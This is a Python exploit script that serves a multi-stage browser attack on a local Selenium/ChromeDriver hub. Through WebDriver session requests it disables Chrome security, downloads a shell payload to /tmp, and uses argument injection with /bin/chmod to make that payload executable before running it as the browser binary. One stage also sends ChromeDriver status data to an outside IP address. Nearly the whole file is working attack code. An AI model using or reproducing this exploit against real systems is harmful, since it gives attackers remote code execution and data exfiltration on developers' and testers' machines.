#!/usr/bin/env python3

import time
import os
import shutil
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer
from threading import Thread
import subprocess

http_server_ip = '192.168.88.200'
http_server_port = 9090

# Start chrome with relaxed security settings
stage0_script = '''<script>
var caps = {
  "browserName": "chrome",
  "goog:chromeOptions": {
    "args":["--disable-web-security", "--no-sandbox", "--app=%s"],
    "prefs": {
      "download.default_directory": "/tmp",
      "safebrowsing.enabled": "false"
    }
  }
};

var opts = {
  "desiredCapabilities": caps,
  "capabilities": {
    "firstMatch": [caps]
  }
};

var req = new XMLHttpRequest();
req.open('POST', 'http://127.0.0.1:4444/wd/hub/session');
req.setRequestHeader('Content-Type', 'text/plain');
req.send(JSON.stringify(opts));
</script>
''' % ("http://%s:%d/stage1" % (http_server_ip, http_server_port))

# TODO download file to /tmp (click on data: link)
stage0_html = '''
<html>
  <body>
    <iframe src='data:text/html,%s' style='display: none;'></iframe>
  </body>
</html>
''' % urllib.parse.quote(stage0_script)

stage2_script = """
<script>
var req = new XMLHttpRequest();
req.open('POST', 'http://127.0.0.1:4444/wd/hub/session');
req.setRequestHeader('Content-Type', 'text/plain');

var opts = {
  "binary":"/bin/chmod",
  "args":["-w+x", "=", "--unknown"],
  "prefs": {"useAutomationExtension": false},
  "excludeSwitches":["disable-client-side-phishing-detection","enable-logging","log-level","password-store","allow-pre-commit-input","disable-background-networking","disable-default-apps","disable-hang-monitor","disable-popup-blocking","disable-prompt-on-repost","disable-sync","enable-automation","enable-blink-features","no-first-run","no-service-autorun","test-type","use-mock-keychain"]
};

var caps = {
  "desiredCapabilities":{
    "browserName":"chrome",
    "goog:chromeOptions": opts
  },
  "capabilities":{
    "firstMatch":[
      {
        "browserName":"chrome",
        "goog:chromeOptions": opts
      }
    ]
  }
};

req.send(JSON.stringify(caps));
</script>
"""

stage3_script = """
<script>
var req = new XMLHttpRequest();
req.open('POST', 'http://127.0.0.1:4444/wd/hub/session');
req.setRequestHeader('Content-Type', 'text/plain');

var opts = {
  "binary":"/tmp/--unknown"
};

var caps = {
  "desiredCapabilities":{
    "browserName":"chrome",
    "goog:chromeOptions": opts
  },
  "capabilities":{
    "firstMatch":[
      {
        "browserName":"chrome",
        "goog:chromeOptions": opts
      }
    ]
  }
};

req.send(JSON.stringify(caps));
</script>
"""



stage1_script = '''
<script>
var link = document.createElement("a");
link.href = '%s';
document.body.appendChild(link);
link.click();
document.body.removeChild(link);
delete link;

setTimeout(function() {
  var iframe = document.createElement("iframe");
  iframe.src = 'data:text/html,%s';
  document.body.appendChild(iframe);

  setTimeout(function() {
    var iframe = document.createElement("iframe");
    iframe.src = 'data:text/html,%s';
    document.body.appendChild(iframe);
  }, 2000);
}, 2000);
</script>
''' % ("http://%s:%d/payload" % (http_server_ip, http_server_port), urllib.parse.quote(stage2_script), urllib.parse.quote(stage3_script))

stage1_html = '''
<html>
  <body>
  %s
  </body>
</html>
''' % stage1_script


stage2 = """
<html>
  <body>
    <h1>STAGE2</h1>
    <div id='data'></div>
    <script>
    var req = new XMLHttpRequest();
    req.overrideMimeType('application/json');
    req.open('GET', 'http://127.0.0.1:9515/wd/hub/status', true);
    req.onload  = function() {
        var elem = document.createElement("img");
        elem.setAttribute("src", "http://164.90.205.247:9090/data?a=" + req.responseText);
        document.getElementById("data").appendChild(elem);
    };
    req.send(null);
    </script>
  </body>
</html>
"""

class HttpServer:
    def __init__(self, ip, port):
        self.httpd = HTTPServer((ip, port), self.HttpHandler)
        self.thread = Thread(target=self.httpd.serve_forever)

    def start(self):
        print("[*] Starting HTTP server")
        self.thread.start()

    def stop(self):
        print("[*] Stopping HTTP server")
        self.httpd.shutdown()
        self.thread.join()

    class HttpHandler(BaseHTTPRequestHandler):
        def _set_headers(self):
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

        def do_HEAD(self):
            self._set_headers()

        def do_GET(self):
            #self._set_headers()

            if self.path == '/csrf':
                print("CSRF!!!")
                html = stage2
            elif self.path == '/data':
                print("DATA!!!")
                html = '<html><body><a href="/download">DOWNLOAD</a></body></html>'
            elif self.path == '/payload':
                with open('payload.sh', 'rb') as f:
                    self.send_response(200)
                    self.send_header("Content-Type", 'application/octet-stream')
                    self.send_header("Content-Disposition", 'attachment; filename="--unknown"')
                    fs = os.fstat(f.fileno())
                    self.send_header("Content-Length", str(fs.st_size))
                    self.end_headers()
                    shutil.copyfileobj(f, self.wfile)
            elif self.path == '/stage1':
                print("STAGE 1")
                self._set_headers()
                self.wfile.write(stage1_html.encode())
            else:
                # Stage 0
                self._set_headers()
                self.wfile.write(stage0_html.encode())


if __name__ == "__main__":
    http_server = HttpServer(http_server_ip, http_server_port)

    try:
        http_server.start()
        time.sleep(3600)
    except KeyboardInterrupt:
        pass
    finally:
        http_server.stop()
